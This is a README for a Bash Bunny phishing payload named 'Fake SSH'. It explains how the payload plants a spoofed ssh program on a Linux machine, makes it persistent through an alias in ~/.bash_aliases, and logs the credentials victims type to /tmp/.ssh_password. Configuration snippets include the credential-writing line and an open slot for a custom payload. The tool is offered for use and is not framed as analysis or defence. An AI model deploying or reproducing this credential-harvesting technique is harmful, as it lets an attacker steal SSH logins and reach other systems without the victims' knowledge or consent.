# Fake SSH

- Title:         Fake SSH
- Author:        TW-D
- Version:       1.0
- Target:        Linux
- Category:      Phishing

## Description

1) Copies the "ssh" command spoofing program to the user's home directory.
2) Defines a new persistent "ssh" alias with the file "~/.bash_aliases".
3) When the user executes the command "ssh" in a terminal, the spoofing program :
- __By default__ retrieves the username@address and password and writes them to "/tmp/.ssh_password".
- __But__ this behavior can be changed in line 20 of the "ssh-phishing.sh" file.

## Configuration

From "payload.txt" change the values of the following constant :
```bash

######## INITIALIZATION ########

readonly BB_LABEL="BashBunny"

```

From "ssh-phishing.sh" change the values of the following constants if necessary :
```bash

readonly MAXIMUM_ATTEMPTS=3

```

From "ssh-phishing.sh", change the payload if you wish :
```bash
##
# <YOUR-PAYLOAD>
##
/bin/echo "${1}:${ssh_password}" >> /tmp/.ssh_password
##
# </YOUR-PAYLOAD>
##
```